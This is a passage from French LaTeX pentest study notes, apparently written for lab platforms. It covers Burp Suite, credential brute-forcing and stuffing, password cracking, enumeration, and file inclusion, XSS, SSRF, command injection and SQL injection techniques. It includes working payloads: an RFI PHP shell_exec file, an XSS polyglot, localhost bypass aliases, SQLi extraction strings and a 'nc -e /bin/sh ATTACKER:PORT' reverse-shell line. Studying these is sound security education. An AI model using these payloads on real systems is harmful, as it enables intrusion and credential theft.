    \item Choix de la position et du type de payload
    \item Un seul set pour Sniper/Battering Ram
    \item Multiple sets pour Pitchfork/Cluster Bomb (ordre : haut-bas, gauche-droite)
\end{itemize}

\textbf{2. Payload Settings :}

Options spécifiques au type sélectionné. Pour "Simple list" :
\begin{itemize}
    \item Ajout manuel (Add text box)
    \item Collage de lignes (Paste lines)
    \item Chargement depuis fichier (attention aux listes volumineuses)
\end{itemize}

\textbf{3. Payload Processing :}

Règles appliquées à chaque payload avant envoi :
\begin{itemize}
    \item Capitalisation
    \item Exclusion par regex
    \item Transformations diverses
\end{itemize}

\textbf{4. Payload Encoding :}

Personnalisation de l'encodage. URL-encoding actif par défaut pour transmission sécurisée. Possibilité de modifier la liste de caractères encodés ou désactiver l'option.

\subsection{Types d'Attaque}

\subsubsection{Sniper}

Type par défaut. Itère linéairement à travers les payloads, un à la fois dans chaque position.

\begin{center}
\begin{tabular}{|c|c|}
\hline
\textbf{Position} & \textbf{Payload Set} \\
\hline
username & $n_1$ payloads \\
password & $n_1$ payloads \\
\hline
\multicolumn{2}{|c|}{Requêtes : $n_1 \times 2$} \\
\hline
\end{tabular}
\end{center}

\textbf{Calcul :} Wordlist de \monosp{n} payloads sur \monosp{p} positions $\rightarrow$ \monosp{n × p} requêtes.

\textbf{Usage :} Attaques single-position (brute-force passwords, fuzzing endpoints API).

\subsubsection{Battering Ram}

Place le même payload simultanément dans toutes les positions.

\begin{center}
\begin{tabular}{|c|c|}
\hline
\textbf{Position} & \textbf{Payload Set} \\
\hline
username & $n_1$ payloads \\
password & $n_1$ payloads (même) \\
\hline
\multicolumn{2}{|c|}{Requêtes : $n_1$} \\
\hline
\end{tabular}
\end{center}

\textbf{Calcul :} Wordlist de \monosp{n} payloads $\rightarrow$ \monosp{n} requêtes (positions multiples).

\textbf{Usage :} Test du même payload contre plusieurs positions simultanément, tests de race conditions.

\subsubsection{Pitchfork}

Utilise un payload set par position (max 20). Itère simultanément à travers tous les sets.

\begin{center}
\begin{tabular}{|c|c|}
\hline
\textbf{Position} & \textbf{Payload Set} \\
\hline
username & $n_1$ payloads \\
password & $n_2$ payloads \\
\hline
\multicolumn{2}{|c|}{Requêtes : $\min(n_1, n_2)$} \\
\hline
\end{tabular}
\end{center}

\textbf{Calcul :} Sets de tailles $n_1, n_2, ..., n_p$ $\rightarrow$ $\min(n_1, n_2, ..., n_p)$ requêtes.

\textbf{Important :} S'arrête quand le set le plus court est épuisé. Idéal avec sets de même longueur.

\textbf{Usage :} Credential stuffing, positions multiples avec sets distincts.

\subsubsection{Cluster Bomb}

Teste toutes les combinaisons possibles de tous les payload sets.

\begin{center}
\begin{tabular}{|c|c|}
\hline
\textbf{Position} & \textbf{Payload Set} \\
\hline
username & $n_1$ payloads $\times$ $n_2$ fois \\
password & $n_2$ payloads $\times$ $n_1$ fois \\
\hline
\multicolumn{2}{|c|}{Requêtes : $n_1 \times n_2$} \\
\hline
\end{tabular}
\end{center}

\textbf{Calcul :} Sets de tailles $n_1, n_2, ..., n_p$ $\rightarrow$ $n_1 \times n_2 \times ... \times n_p$ requêtes.

\textbf{Attention :} Génère un trafic important. Avec Community et rate-limiting, les attaques avec sets volumineux sont très longues.

\textbf{Usage :} Brute-force de credentials sans mapping connu username/password.

\subsection{Credential Stuffing avec CSRF et Macro}

Contexte : certaines applications génèrent des tokens CSRF (champs cachés) et cookies de session dynamiques à chaque requête. Pour automatiser une attaque par Intruder, il faut extraire ces valeurs à chaque tentative via un macro.

\textbf{Principe :} Le macro effectue une requête GET vers la page de login pour récupérer un token/cookie frais, puis Intruder utilise ces valeurs dans chaque tentative de brute-force.

\textbf{Configuration Intruder :}
\begin{itemize}
    \item Capturer la requête POST de login, \textit{Send to Intruder}
    \item Attack type : Pitchfork ; positions sur les champs d'authentification uniquement (ex: username, password)
    \item Ne pas marquer les positions du token CSRF ni des cookies (gérés par le macro)
    \item Charger les wordlists appropriées
\end{itemize}

\textbf{Créer le macro (Settings > Sessions > Macros) :}
\begin{itemize}
    \item \textit{Add} $\rightarrow$ sélectionner une requête GET vers la page de login
    \item Donner un nom descriptif au macro
\end{itemize}

\textbf{Session Handling Rule :}
\begin{itemize}
    \item Ajouter une règle, onglet Details : \textit{Run a macro} $\rightarrow$ choisir le macro créé
    \item Restreindre les remplacements : cocher "Update only the following parameters" (ex: csrf\_token, loginToken) et "Update only the following cookies" (ex: session, PHPSESSID)
    \item Onglet Scope : Tools Scope = Intruder uniquement ; URL Scope = cible visée
\end{itemize}

\textbf{Validation :}
\begin{itemize}
    \item Codes de statut uniformes (302, 200) indiquent un macro fonctionnel
    \item Codes 403/401 systématiques = macro mal configuré ou tokens non extraits
    \item Trier par longueur de réponse pour identifier les credentials valides
\end{itemize}

\section{Burp Suite Decoder}

\subsection{Objectif}

Decoder permet la manipulation de données via encodage, décodage et hachage. Utile pour transformer les données interceptées ou préparer des payloads avant envoi.

\subsection{Interface}

L'interface se compose de :

\begin{itemize}
    \item \textbf{Input} : Zone de saisie pour les données à traiter (texte ou hexadécimal)
    \item \textbf{Format} : Choix entre traitement en texte ou en valeurs hexadécimales
    \item \textbf{Transformations} : Menus déroulants pour encoder, décoder ou hasher
    \item \textbf{Smart Decode} : Décodage automatique récursif jusqu'au plaintext
\end{itemize}

Les transformations s'empilent : chaque opération génère une nouvelle sortie utilisable pour d'autres transformations.

\subsection{Méthodes d'Encodage/Décodage}

\textbf{URL} : Substitue les caractères par leur code ASCII hexadécimal précédé de \monosp{\%}. Exemple : \monosp{/} devient \monosp{\%2F}.

\textbf{HTML} : Remplace les caractères spéciaux par des entités HTML (ex: \monosp{\&\#x42;} pour "B"). Prévient les attaques XSS.

\textbf{Base64} : Convertit les données en format ASCII-compatible. Méthode d'encodage très courante.

\textbf{ASCII Hex} : Convertit entre représentations ASCII et hexadécimales. Exemple : "ASCII" $\rightarrow$ "4153434949".

\textbf{Hex, Octal, Binary} : Conversions entre représentations numériques (décimal, hexadécimal, octal, binaire).

\textbf{Gzip} : Compression de données. Réduit la taille des fichiers avant transmission.

\subsection{Vue Hexadécimale}

Le mode \textit{Hex View} permet l'édition byte-par-byte en format hexadécimal. Essentiel pour travailler avec des fichiers binaires ou données non-ASCII.

\subsection{Hachage}

Decoder génère des hashsums pour vérifier l'intégrité des données :

\begin{itemize}
    \item Menu \textit{Hash} : sélection de l'algorithme (MD5, SHA-256, etc.)
    \item Sortie automatique en vue hexadécimale
    \item Encodage ASCII Hex pour obtenir une chaîne hex lisible
\end{itemize}

\textbf{Note :} Le hachage est unidirectionnel et irréversible. Utilisé pour stocker les mots de passe ou vérifier l'intégrité des fichiers.

\section{Burp Suite Comparer}

Permet la comparaison de deux ensembles de données au niveau des mots ou des octets. Utile pour identifier les différences entre requêtes/réponses.

\textbf{Chargement} : \textit{Paste}, \textit{Load} ou \textit{Send to Comparer}.

\textbf{Comparaison} : Sélectionner deux datasets puis cliquer sur \textit{Words} ou \textit{Bytes}. Affichage côte-à-côte avec code couleur (ajouté/supprimé/modifié).

\section{Burp Suite Sequencer}

\subsection{Objectif}

Sequencer évalue l'entropie (aléatoire) des tokens générés par l'application. Les tokens (cookies de session, tokens CSRF) doivent être cryptographiquement sécurisés pour empêcher leur prédiction.

\subsection{Modes d'Analyse}

\textbf{Live Capture} : Envoie automatiquement la même requête des milliers de fois pour collecter des échantillons de tokens. Mode par défaut et le plus utilisé.

\textbf{Manual Load} : Charge une liste pré-générée de tokens pour analyse. Moins bruyant mais nécessite des échantillons existants.

\subsection{Configuration Live Capture}

\textbf{1) Envoi de la requête :}

Capturer une requête générant un token (ex: GET vers page de login) > \textit{Send to Sequencer}.

\textbf{2) Sélection du token :}

Dans "Token Location Within Response" :
\begin{itemize}
    \item \textbf{Cookie} : Pour les cookies de session
    \item \textbf{Form field} : Pour les champs de formulaire (ex: loginToken)
    \item \textbf{Custom location} : Localisation manuelle
\end{itemize}

\textbf{3) Capture :}

\begin{itemize}
    \item Cliquer sur \textit{Start live capture}
    \item Attendre $\sim$10,000 tokens (plus = meilleure précision)
    \item \textit{Pause} puis \textit{Analyze now} (ou \textit{Auto analyze} pour analyse périodique)
\end{itemize}

\subsection{Rapport d'Analyse}

\textbf{Overall result} : Évaluation globale de la sécurité de génération des tokens.

\textbf{Effective entropy} : Mesure de l'aléatoire en bits. Valeur élevée ($>$100 bits) = tokens sécurisés.

\textbf{Reliability} : Niveau de confiance (ex: 1\% = 99\% de confiance).

\textbf{Sample} : Détails sur les échantillons analysés (nombre, caractéristiques).

\textbf{Analyses détaillées} : Character-level et bit-level analysis pour investigations approfondies si nécessaire.

\textbf{Note :} Un rapport favorable indique une génération sécurisée mais ne garantit pas l'absence totale de vulnérabilités.

\section{Burp Suite Organizer}

\subsection{Objectif}

Organizer permet de stocker et annoter des copies de requêtes HTTP pour consultation ultérieure. Utile pour organiser le workflow de pentesting et préparer les rapports.

\subsection{Fonctionnalités}

\textbf{Stockage de requêtes} :
\begin{itemize}
    \item Requêtes à investiguer plus tard
    \item Requêtes identifiées comme intéressantes
    \item Requêtes destinées aux rapports
\end{itemize}

\textbf{Envoi vers Organizer} : Clic droit sur une requête > \textit{Send to Organizer} ou \monosp{Ctrl + O}. Crée une copie read-only au moment de l'envoi.

\subsection{Interface}

Les requêtes sont affichées dans un tableau avec colonnes :

\begin{itemize}
    \item \textbf{Index} : Numéro de requête
    \item \textbf{Time} : Horodatage
    \item \textbf{Workflow status} : Statut de traitement
    \item \textbf{Tool} : Module Burp source (Proxy, Repeater, etc.)
    \item \textbf{Method} : Méthode HTTP (GET, POST, etc.)
    \item \textbf{Hostname} : Serveur cible
    \item \textbf{Path} : Chemin URL
    \item \textbf{Query} : Query string
    \item \textbf{Parameters} : Nombre de paramètres
    \item \textbf{Status} : Code de statut HTTP
    \item \textbf{Length} : Taille de la réponse en bytes
    \item \textbf{Notes} : Annotations personnelles
\end{itemize}

\subsection{Consultation}

Cliquer sur un item pour visualiser la requête et sa réponse en mode lecture seule. Fonction de recherche disponible dans les barres sous la requête/réponse.

\newpage


\chapter{Cryptographie}

\section{Crackstation}

\textbf{Crackstation} : \url{https://crackstation.net/}

Permet de retrouver la chaîne d'origine d'un hash.

\section{Password Cracking}

\subsection{Attaques Principales}

\textbf{Dictionary Attacks} : Utilisation de wordlists prédéfinies (\monosp{rockyou.txt}, \monosp{common-passwords.txt}). Rapide et efficace contre les mots de passe courants.

\textbf{Mask Attacks} : Attaques limitées à un format spécifique (ex: \monosp{?l?l?l?d?d} = 3 lettres + 2 chiffres). Équilibre entre vitesse et exhaustivité.

\subsection{Outils Courants}

\begin{itemize}
    \item \textbf{PDF} : \monosp{pdfcrack}, \monosp{john} (via \monosp{pdf2john})
    \item \textbf{ZIP} : \monosp{fcrackzip}, \monosp{john} (via \monosp{zip2john})
    \item \textbf{Généraliste} : \monosp{john}, \monosp{hashcat} (GPU)
\end{itemize}

\subsection{Processus}

\cmd{pdfcrack -f flag.pdf -w /usr/share/wordlists/rockyou.txt}

\cmd{zip2john flag.zip > ziphash.txt}

\cmd{john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt}

\subsection{Détection}

\textbf{Binaires} : john, hashcat, fcrackzip, pdfcrack, zip2john.

\textbf{Indicateurs} : Arguments \monosp{--wordlist}, \monosp{-w}, \monosp{--mask}; fichiers \monosp{\textasciitilde/.john/john.pot}, \monosp{.hashcat/hashcat.potfile}.

\textbf{GPU} : Utilisation élevée de GPU avec processus hashcat ou john, bibliothèques \monosp{nvcuda.dll}, \monosp{libcuda.so}.

\newpage
\chapter{Phishing}
\section{Social Engineer ToolKit}
ToolKit trop fort : \url{https://github.com/trustedsec/social-engineer-toolkit}\\
Mass Mailer peut envoyer des mails avec n'importe quel email

\newpage
\chapter{Web}

\section{Website Discovery}

\subsection{Tech Stack Discovery}

\subsubsection{Websites Tools - Website Info}

\textbf{Wappalyzer} : \url{https://www.wappalyzer.com/}

Donne la tech stack d'un site web.

\textbf{WayBack Machine} : \url{https://web.archive.org/}

Donne les archives du nom de domaine.

\subsubsection{Divers}

\textbf{FavIcon Framework} : Dans le HEAD de l'HTML, on peut trouver la référence du favicon, qui indique le framework et sa version (failles possibles).

Référence : \url{https://wiki.owasp.org/index.php/OWASP_favicon_database}

\subsubsection{HTTP}

\textbf{Headers} : 

\cmd{curl URL -v}

Donne des infos comme le type de serveur web et sa version.

\subsection{Page/Subdomain Discovery}

\subsubsection{Fichiers}

\begin{itemize}
    \item \textbf{Robots.txt} : Fichier pour les robots, contient parfois des routes secrètes
    \item \textbf{Sitemap.xml} : Fichier de plan du site, contient les routes autorisées mais parfois obsolète
\end{itemize}

\subsubsection{CT Logs}

Logs générés quand un domaine est authentifié par certificat SSL (BD logs : \monosp{crt.sh}).

\subsubsection{Automated Discovery}

\textbf{Sous-Domaines}

\textbf{DNS recon} : énumère les subdomains

\cmd{dnsrecon -t brt -d acmeitsupport.thm}

\textbf{Sublist3r} : même chose en plus rapide

\cmd{./sublist3r.py -d acmeitsupport.thm}

\textbf{ffuf} : énumère, mais doit être filtré niveau taille

Étapes :
\begin{enumerate}
    \item Commande sans \monosp{-fs size}
    \item Commande avec \monosp{-fs size} en remplaçant size par la taille générique
\end{enumerate}

\cmd{ffuf -w /PathToNameList/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.80.176.7 -fs \{size\}}

\textbf{Pages}

\textbf{ffuf} : énumère les pages

\cmd{ffuf -w /pathToWordList/common.txt -u http://10.80.177.30/FUZZ}

\textbf{dirb} :

\cmd{dirb http://10.80.177.30/ /pathToWordList/common.txt}

\textbf{gobuster} :

\cmd{gobuster dir --url http://10.80.177.30/ -w /pathToWordList/common.txt}

\section{HTTP Requests avec cURL}

\textbf{cURL} est un outil en ligne de commande pour créer des requêtes HTTP et visualiser les réponses brutes. Idéal pour tester des applications web sans navigateur.

\subsection{Commandes de base}

\textbf{Requête GET :}

\cmd{curl http://site.com}

\textbf{Requête POST :}

\cmd{curl -X POST -d "username=admin\&password=pass" http://site.com/login}

\textbf{Options principales :}
\begin{itemize}
    \item \monosp{-X POST} : méthode POST
    \item \monosp{-d "data"} : données du body (URL-encoded)
    \item \monosp{-i} : afficher les headers de réponse
    \item \monosp{-s} : mode silencieux (pas de progression)
\end{itemize}

\subsection{Gestion des Cookies}

\textbf{Sauvegarder les cookies :}

\cmd{curl -c cookies.txt -d "username=admin\&password=pass" http://site.com/login}

\textbf{Réutiliser les cookies :}

\cmd{curl -b cookies.txt http://site.com/dashboard}

Permet de maintenir une session active entre plusieurs requêtes.

\subsection{Automatisation}

Possible de scripter cURL pour du brute-force ou des tests automatisés :
\begin{itemize}
    \item Lire une wordlist avec \monosp{for pass in \$(cat wordlist.txt)}
    \item Envoyer une requête pour chaque entrée
    \item Analyser la réponse avec \monosp{grep} pour détecter le succès
\end{itemize}

Cette méthode est la base d'outils comme Hydra, Burp Intruder et WFuzz.

\subsection{Bypass User-Agent}

Certaines applications bloquent cURL via le header User-Agent.

\textbf{Spécifier un User-Agent personnalisé :}

\cmd{curl -A "Mozilla/5.0" http://site.com}

\section{Confidentialité}

\subsection{Enumeration}

\subsubsection{Username Enumeration}

\textbf{ffuf} : permet l'énumération d'username en filtrant les réponses de requêtes

\cmd{ffuf -w /PathToWordList/names.txt -X POST -d "username=FUZZ\&email=x\&password=x\&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.80.189.140/customers/signup -mr "username already exists"}

\subsubsection{BruteForce}

\textbf{ffuf} : permet de bruteforcer des username via énumération

\cmd{ffuf -w valid\_usernames.txt:W1,/PathToPasswordFile/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1\&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.80.189.140/customers/login -fc 200}

\subsection{Cookie Tampering}

\subsubsection{Cookies}

Définir les cookies avec un Curl sur les sites peu sécurisés peut fonctionner, même s'il est hashé :

\cmd{curl -H "Cookie: session=abc123; theme=dark" http://site.com}

\subsection{IDOR}

\paragraph{Définition :} Insecure Direct Object Reference \\
Léger abus de langage, mais le concept c'est que une fois authentifié, le serveur ne va pas vérifier si les données que nous demandons sont les notres, (\textbf{HORIZONTAL} privilege escalation).\\
La condition est donc de trouver le point d'entrée ou on ne verifie pas cette entrée, par exemple une URL : \monosp{/details.php?user=2}).\\
les failles \textbf{IDOR} peuvent etre bien camouflées, par exemple avec l'ID hashé, encodé en base64, mais a partir du moment ou c'est pas check niveau serveur, c'est pas safe.
\paragraph{Spotting :}
Pour voir si faille IDOR : créer 2 comptes et échanger les ID dans les requêtes.

\subsection{UUID Determinism}
Les UUID (ou du moins certaines version) sont détriministiques, c'est a dire qu'avec suffisament d'info on peut en recréer/en deviner :
\url{https://www.uuidtools.com/decode} permet de décoder les UUID

\section{File Inclusion}

\paragraph{Définition :}
Quand un serveur web peut \monosp{include()} des fichiers, on va tenter de modifier le chemin d'accès pour avoir accès à d'autres fichiers. Si les permissions sont mal gérées, on va pouvoir acceder a des fichiers compromettants/effectuer une \textbf{RCE}

\subsection{Directory Traversal}
C'est plus un Trick qu'autre chose mais c'est necessaire pour le \textbf{LFI}, le concept est de se deplacer dans une arborescence de fichier en utilisant \monosp{../../../} dans un nom de fichier.

\subsection{Local File Inclusion}
File Inclusion en local, c'est a dire on va essayer d'\textbf{include()} les fichiers qui sont déja sur le serveur. Par exemple avec un formulaire/une url qui récupere du code php sur le serveur\\


\paragraph{Filtre extension\\}

Si on a une sécurité dans le nom du fichier (par exemple s'il doit finir par \monosp{.php} pour être renvoyé), on peut utiliser le null byte pour annuler la fin de string : \monosp{\%00} (fonctionne jusqu'à PHP 5.3.4).

\paragraph{Filtre keywords\\}

Si il y a un filtre strict de keywords, on peut faire \monosp{dir/file/.} qui renvoie \monosp{file}.

\paragraph{Filtre ../\\}

Si la string \monosp{../} est filtrée, on peut la doubler : \monosp{....//....//....//....//....//etc/passwd} et par concaténation ça va reformer le bon chemin.

\paragraph{Filtre parfait\\}

Il reste une autre méthode : si le site utilise \monosp{\$\_REQUEST}, on peut directement définir ça via un curl (\monosp{file=/../../../../etc/passwd}).

\subsection{Remote File Inclusion}

Cette fois, on utilise des fichiers externes pour attaquer le serveur, en forcant le serveur a load du php malveillant par exemple.\\
Implique que \monosp{allow\_url\_fopen} soit activé.

\textbf{Exemple :}

\textbf{1) Créer le fichier PHP suivant sur notre machine :}

\begin{codebox}{exploit.php}
\begin{lstlisting}[language=PHP]
<?php echo shell_exec("hostname"); ?>
\end{lstlisting}
\end{codebox}

Ce dernier exécute la commande \monosp{hostname} (remplaçable par autre chose).

\textbf{2) Créer un serveur web pour l'héberger :}

\cmd{python3 -m http.server 80}

\textbf{3)} On met l'URL de notre serveur dans l'input du site, ça va exécuter la commande si il y a bien \monosp{include()}.

\section{Failles XSS (Cross Site Scripting)}

\paragraph{Définition :} Cross Site Scripting\\
Exécuter du code JavaScript sur le serveur/compte d'un autre utilisateur en injectant du code (payload) dans des données qui vont être affichées sur un site. Le plus souvent on y ajoute un CallBack (\monosp{GET monIp.com}) qui permet de récupérer les infos (keylogger, récup cookies auth, etc.).

\subsection{Types de XSS}

\subsubsection{Reflected XSS}

Dans le cas où on peut jouer avec la queryString, on peut y injecter du code.

Exemple : un site web qui affiche "bonjour USER" à l'adresse \urlcode{siteweb.com/user=USER} peut être utilisé avec \urlcode{siteweb.com/user=<script>...</script>}.

\subsubsection{Stored XSS}

Est utilisé si le payload peut être stocké dans une BD, par exemple un commentaire sur une publication qui contient \monosp{<script>...</script>}.

\subsubsection{DOM Based}

Plus rare, mais si la page accède à des éléments du DOM du site et qu'on a accès à ces éléments, on peut y injecter du code (par exemple un site qui vérifie la version du navigateur et on la change à \monosp{<script>...</script>}).

\subsubsection{Blind XSS}

Très similaire au Stored XSS à la seule différence qu'on ne voit pas ce qui se passe (à destination du staff).

\subsection{Sécurité et Bypass}

Souvent, la valeur envoyée va être vérifiée, ou placée dans un élément HTML, mais ça reste parfois contournable.

\subsubsection{Éléments HTML}

\textbf{Input :}

\begin{codebox}{xss-input.html}
\begin{lstlisting}[language=HTML]
'><script>...</script>
\end{lstlisting}
\end{codebox}

Échappe la fin du input.

\textbf{Textarea :}

\begin{codebox}{xss-textarea.html}
\begin{lstlisting}[language=HTML]
</textarea><script>...</script>
\end{lstlisting}
\end{codebox}

Balise de fin.

\textbf{JS directement :}

\begin{codebox}{xss-js.js}
\begin{lstlisting}[language=Java]
';alert('failleXSSTrouvee');//
\end{lstlisting}
\end{codebox}

Dans le cas où le code JS met directement la valeur dedans, on sort avec \monosp{'}, on exécute notre payload puis avec \monosp{//} on fait passer le reste du code en commentaire.

\subsubsection{Filtrage de la String}

\textbf{Si "script" est filtré :}

\begin{codebox}{xss-bypass-script.html}
\begin{lstlisting}[language=HTML]
<scscriptript>...</scriscriptpt>
\end{lstlisting}
\end{codebox}

Bon vieux trick comme pour le File Inclusion.

\textbf{Si "<" et ">" filtrés :}

\begin{codebox}{xss-bypass-brackets.html}
\begin{lstlisting}[language=HTML]
src=/images/cat.jpg" onload="alert('THM');
\end{lstlisting}
\end{codebox}

On peut utiliser les attributs JavaScript des éléments (img par exemple).

\subsubsection{XSS Polyglot}

Cette horreur fait tout à la fois :

\begin{codebox}{xss-polyglot.js}
\begin{lstlisting}[language=html]
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
\end{lstlisting}
\end{codebox}

\section{SSRF (Server-Side Request Forgery)}

\subsection{Concept}

Le serveur va faire un appel API dépendant des modifications faites sur la page, on tente donc de manipuler cet appel pour récupérer des données. Ressemble d'une certaine façon aux File Inclusion, de par la manipulation d'URL.

\subsection{Spotting}

\subsubsection{URL Inception}

Quand dans une URL, on en retrouve une autre.

Exemple : \urlcode{https://mapage.com/server=https://data.com}

\subsubsection{Hidden Form URL}

Quand un formulaire contient une URL cachée.

\begin{codebox}{hidden-form.html}
\begin{lstlisting}[language=HTML]
<form action="/fetch-remote-resource" method="POST">
    <!-- Champ cache contenant une URL fournie par l'utilisateur -->
    <input type="hidden" name="target_url" 
           value="http://exemple-interne.local/resource">
    
    <button type="submit">Envoyer</button>
</form>
\end{lstlisting}
\end{codebox}

\subsubsection{Partial URL}

On retrouverait par exemple le nom du serveur à appeler.

Exemple : \urlcode{https://mapage.com/server=api}

\subsubsection{URL Path}

Dans le cas où on retrouve le path d'une URL.

Exemple : \urlcode{https://mapage.com/dest=/forms/contact/}

\subsection{Utilisation}

\subsubsection{Redirection externe}

En changeant la route d'appel API, on peut ainsi accéder à des API internes au service.

\subsubsection{Redirection interne}

On peut aussi rediriger vers notre propre serveur, afin de capturer les headers de requête.

\textbf{Tips :} Pour couper une URL (par exemple param \monosp{server=XXX}), on finit par \monosp{\&x=}, ce qui bloque la fin de l'URL.

\subsection{Protections}

\subsubsection{Deny List}

Les adresses bloquées (généralement \monosp{Localhost} et \ip{169.254.169.254} car infos sur la machine/infrastructure cloud) peuvent être contournées :

\begin{itemize}
    \item En utilisant un alias pour localhost : \monosp{0}, \monosp{0.0.0.0}, \monosp{0000}, \monosp{127.1}, \monosp{127.*.*.*}, \monosp{2130706433}, \monosp{017700000001}
    \item En utilisant des sous-domaines DNS qui pointent vers l'adresse en question
\end{itemize}

\subsubsection{Allow List}

À l'inverse, par exemple seules les URL provenant de \urlcode{https://page.com} pourraient être autorisées. Pour contourner ça, on peut créer un sous-nom de domaine : \urlcode{https://page.com.attack.fr}.

\subsubsection{Open Redirect}

Si le filtre est \urlcode{https://page.com/} (avec un slash final), on ne peut pas utiliser le trick du DNS. On peut donc chercher un endpoint du type \urlcode{https://page.com/link=https://XXX} pour l'utiliser.

\section{Command Injection}

\subsection{Concept}
Des applis (PHP, Python, NodeJS) passent des entrées utilisateur à des commandes OS (\textit{grep}, \textit{subprocess}, etc.). Si l'entrée n'est pas contrôlée, un attaquant peut \textbf{chaîner ou remplacer} la commande et exécuter du code.

\subsection{Détection}
\begin{itemize}
    \item \textbf{Verbose} : sortie visible (ex: \monosp{whoami} affiché dans la page).
    \item \textbf{Blind} : pas de sortie; tester des \textit{delays} (\monosp{ping}, \monosp{sleep}) ou redirections (\monosp{> /tmp/out}; puis \monosp{cat}).
    \item \textbf{Chaînage} : opérateurs \monosp{;} \monosp{\&} \monosp{\&\&} pour exécuter plusieurs commandes.
\end{itemize}

\subsection{Exemples rapides}
\begin{itemize}
    \item \textbf{curl} : \urlcode{http://vulnerable.app/process.phpsearch=The\%20Beatles;whoami}
    \item \textbf{Linux} : \monosp{whoami}, \monosp{ls}, \monosp{ping -c 5 127.0.0.1}, \monosp{sleep 5}, \monosp{nc -e /bin/sh ATTACKER:PORT}
    \item \textbf{Windows} : \monosp{whoami}, \monosp{dir}, \monosp{ping -n 5 127.0.0.1}, \monosp{timeout /t 5}
\end{itemize}

\subsection{Prévention (dev view)}
\begin{itemize}
    \item Éviter les fonctions dangereuses (PHP: \monosp{exec}, \monosp{passthru}, \monosp{system}).
    \item \textbf{Sanitisation/Validation} stricte : n'accepter que des formats attendus (ex: chiffres 0-9), filtrer caractères spéciaux (\monosp{> \& /}).
    \item Préférer APIs/bibliothèques plutôt que shell.
\end{itemize}

\section{SQL Injection}

\subsection{In-Band SQL Injection}

\subsubsection{Concept}
Exploitation via le \textbf{même canal} de communication : découvrir et exploiter une vulnérabilité SQL directement sur la page web, extraire des données de la base de données affichées sur la même page.

\subsubsection{Error-Based}
Les messages d'erreur de la base sont affichés au navigateur. Utile pour énumérer la structure de la BD.

\textbf{Détection :} Tester des caractères spéciaux (\monosp{'} ou \monosp{"}) après un paramètre (ex: \monosp{id=1'}) pour déclencher une erreur.

\textbf{Exemple :} Si \monosp{id=1'} retourne une erreur SQL, la vulnérabilité est confirmée.

\subsubsection{Union-Based}
Utilise l'opérateur SQL \monosp{UNION} pour retourner des résultats supplémentaires. Méthode la plus courante pour extraire de gros volumes de données.

\textbf{Étapes :}
\begin{enumerate}
    \item Trouver le nombre de colonnes : \monosp{1 UNION SELECT 1} → \monosp{1 UNION SELECT 1,2} → \monosp{1 UNION SELECT 1,2,3} (jusqu'à pas d'erreur).
    \item Annuler les premiers résultats : \monosp{0 UNION SELECT 1,2,3} (remplacer ID par 0).
    \item Extraire des infos :
    \begin{itemize}
        \item BD courante : \monosp{0 UNION SELECT 1,2,database()}
        \item Tables : \monosp{0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'nom_bd'}
        \item Colonnes : \monosp{0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'nom_table'}
        \item Données : \monosp{0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM users}
    \end{itemize}
\end{enumerate}

\subsection{Blind SQL Injection}

Peu ou pas de feedback visible ; les messages d'erreur sont désactivés mais l'injection fonctionne.

\subsubsection{Authentication Bypass}
Les formulaires de login vérifient si username ET password forment une paire valide. Injection d'une condition \textit{toujours vraie} :

\textit{Payload :} \monosp{' OR 1=1;--}

Exemple : champ password \monosp{' OR 1=1;--} transforme la requête en :
\begin{lstlisting}[language=SQL]
SELECT * FROM users WHERE username='' AND password='' OR 1=1;--
\end{lstlisting}

Puisque \monosp{1=1} est vrai et on utilise \monosp{OR}, la requête retourne toujours vrai.

\subsubsection{Boolean-Based}
Réponses true/false, yes/no, 1/0. Énumération très lente mais possible en testant chaque caractère.

\textbf{Exemple API} : \urlcode{https://website.thm/checkuser?username=admin} retourne \monosp{\{"taken":true\}}.

\textbf{Énumération du nom de BD :}
\begin{lstlisting}[language=SQL]
admin123' UNION SELECT 1,2,3 where database() like 's%';--
\end{lstlisting}

Tester \monosp{s\%}, \monosp{sa\%}, \monosp{sq\%}, etc. jusqu'à obtenir \textit{true}. Répéter pour chaque caractère.

\textbf{Tables et colonnes :}
\begin{lstlisting}[language=SQL]
admin123' UNION SELECT 1,2,3 FROM information_schema.tables 
WHERE table_schema='sqli_three' and table_name like 'u%';--
\end{lstlisting}

\subsubsection{Time-Based}
Pas d'indicateur visuel ; le délai de réponse indique un payload valide. Utiliser \monosp{SLEEP(x)}.

\textbf{Exemple :}
\begin{lstlisting}[language=SQL]
admin123' UNION SELECT SLEEP(5);--
\end{lstlisting}

Pas de délai = mauvais nombre de colonnes. Ajouter des colonnes :
\begin{lstlisting}[language=SQL]
admin123' UNION SELECT SLEEP(5),2;--
\end{lstlisting}

Si délai de 5 sec → \textit{true}. Puis énumérer comme Boolean-Based en ajoutant \monosp{SLEEP()} à chaque requête.

\subsection{Out-of-Band SQL Injection}

Deux canaux de communication : attaque par web request, résultats par HTTP/DNS vers un serveur contrôlé. Dépend de features BD spécifiques ou logique applicative.

\textbf{Processus :}
\begin{enumerate}
    \item Attaquant envoie payload avec injection SQL.
    \item App fait requête BD qui exécute le payload.
    \item Payload force une requête HTTP/DNS vers la machine de l'attaquant.
    \item Attaquant récupère les données dans la requête reçue.
\end{enumerate}

\end{document}

